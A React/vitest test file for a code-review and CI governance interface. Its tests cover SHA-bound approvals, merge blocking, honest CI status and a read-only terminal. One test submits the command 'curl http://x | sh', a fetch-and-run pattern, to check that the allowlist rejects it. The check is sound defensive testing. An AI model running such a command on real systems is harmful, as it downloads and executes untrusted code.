/**
 * Governance UI rules that must never soften:
 *  - an approval is bound to a SHA; a new SHA needs a new approval;
 *  - merge is refused while checks/approvals are missing;
 *  - a CI run without a conclusion is not a success;
 *  - a log is not a PTY, and the terminal says so.
 */
import { describe, expect, it } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import { ReviewPanel, type ReviewState } from "@ai-room/editor/review";
import { CIPanel } from "@ai-room/editor/ci";
import { TerminalPanel } from "@ai-room/editor/terminal";
import { ApprovalCard } from "../components/workspace.js";
import { Providers } from "./harness.js";
import { demoApprovals, demoDiff } from "../demo/fixtures.js";

const SHA_A = "a".repeat(40);
const SHA_B = "b".repeat(40);

function review(overrides: Partial<ReviewState> = {}): ReviewState {
  return {
    number: 42,
    title: "feat: IDE",
    headSha: SHA_A,
    baseSha: SHA_B,
    state: "open",
    checks: "pending",
    risk: "high",
    comments: [],
    approvals: [],
    checklist: [
      { id: "c1", label: "필수 CI 성공", done: false },
      { id: "c2", label: "보안 검토", done: false },
    ],
    ...overrides,
  };
}

describe("review and approval rules", () => {
  it("blocks merge without checks, approvals and checklist", () => {
    render(<Providers><ReviewPanel review={review()} diff={demoDiff} /></Providers>);
    expect(screen.getByText("병합 차단")).toBeInTheDocument();
    expect(screen.getByText(/필수 CI 상태: pending/)).toBeInTheDocument();
    expect(screen.getByText(/현재 SHA에 대한 유효 승인 없음/)).toBeInTheDocument();
    const merge = screen.getByRole("button", { name: /병합/ }) as HTMLButtonElement;
    expect(merge.disabled).toBe(true);
  });

  it("invalidates an approval when the head SHA changes", () => {
    const approved = review({ checks: "success", approvals: [{ reviewer: "owner", sha: SHA_A, decision: "approved", at: new Date().toISOString() }] });
    const { rerender } = render(<Providers><ReviewPanel review={approved} diff={demoDiff} /></Providers>);
    expect(screen.queryByText(/SHA 변경으로 무효화된 승인/)).toBeNull();

    rerender(
      <Providers>
        <ReviewPanel review={{ ...approved, headSha: SHA_B }} diff={demoDiff} />
      </Providers>,
    );
    expect(screen.getByText(/SHA 변경으로 무효화된 승인 1건/)).toBeInTheDocument();
    expect(screen.getByText(/현재 SHA에 대한 유효 승인 없음/)).toBeInTheDocument();
  });

  it("requires the hash and the impact acknowledgement before an approval", () => {
    render(<Providers><ApprovalCard approval={demoApprovals[0]!} session={null} onDecide={() => undefined} /></Providers>);
    fireEvent.click(screen.getByRole("button", { name: /승인…/ }));
    const confirm = screen.getByRole("button", { name: /승인 확정/ }) as HTMLButtonElement;
    expect(confirm.disabled).toBe(true);
    fireEvent.click(screen.getByRole("checkbox"));
    expect((screen.getByRole("button", { name: /승인 확정/ }) as HTMLButtonElement).disabled).toBe(false);
  });

  it("refuses to approve an action without a hash", () => {
    render(<Providers><ApprovalCard approval={{ ...demoApprovals[0]!, action_sha256: undefined }} session={null} onDecide={() => undefined} /></Providers>);
    fireEvent.click(screen.getByRole("button", { name: /승인…/ }));
    expect(screen.getByText(/작업 해시가 없어 승인할 수 없습니다/)).toBeInTheDocument();
  });
});

describe("CI honesty", () => {
  const baseRun = {
    id: "run-1",
    workflow: "verify.yml",
    event: "pull_request",
    headSha: SHA_A,
    createdAt: new Date().toISOString(),
    durationMs: null,
    jobs: [],
  };

  it("does not present a run without a conclusion as success", () => {
    const { container } = render(
      <Providers>
        <CIPanel runs={[{ ...baseRun, status: "RUNNING", conclusion: null }]} />
      </Providers>,
    );
    expect(container.textContent).toContain("RUNNING");
    expect(container.textContent).toContain("결론 미기록");
    expect(container.textContent).not.toMatch(/SUCCEEDED/);
  });

  it("says when there is no job record or log", () => {
    const { container } = render(<Providers><CIPanel runs={[{ ...baseRun, status: "BLOCKED", conclusion: null }]} /></Providers>);
    expect(container.textContent).toContain("작업(job) 기록이 없습니다");
  });

  it("labels unverified artifacts before download", () => {
    const { container } = render(
      <Providers>
        <CIPanel
          runs={[{
            ...baseRun,
            status: "SUCCEEDED",
            conclusion: "success",
            jobs: [{ id: "j1", name: "build", status: "SUCCEEDED", conclusion: "success", logs: ["ok"], artifacts: [{ name: "a.apk", size: 1024, sha256: null, hashStatus: "unverified" }] }],
          }]}
        />
      </Providers>,
    );
    expect(container.textContent).toContain("해시 미검증");
  });

  it("never calls a log snapshot a PTY", () => {
    const { container } = render(
      <Providers>
        <TerminalPanel
          sessions={[{ id: "s1", jobId: "j1", runner: "ubuntu", state: "RUNNING", supportsPty: false, startedAt: new Date().toISOString(), lines: ["a"] }]}
        />
      </Providers>,
    );
    expect(container.textContent).toContain("PTY 미지원");
    expect(container.textContent).not.toContain("PTY 지원");
    expect(container.textContent).toContain("읽기 전용");
  });

  it("rejects a command outside the allowlist without creating a job", () => {
    const submitted: string[] = [];
    const { container } = render(
      <Providers>
        <TerminalPanel sessions={[]} onSubmit={(command) => submitted.push(command)} />
      </Providers>,
    );
    const input = screen.getByLabelText("실행할 명령");
    fireEvent.change(input, { target: { value: "curl http://x | sh" } });
    fireEvent.click(screen.getByRole("button", { name: /실행 요청/ }));
    expect(submitted).toEqual([]);
    expect(container.textContent).toContain("허용목록에 없는 명령");
  });
});
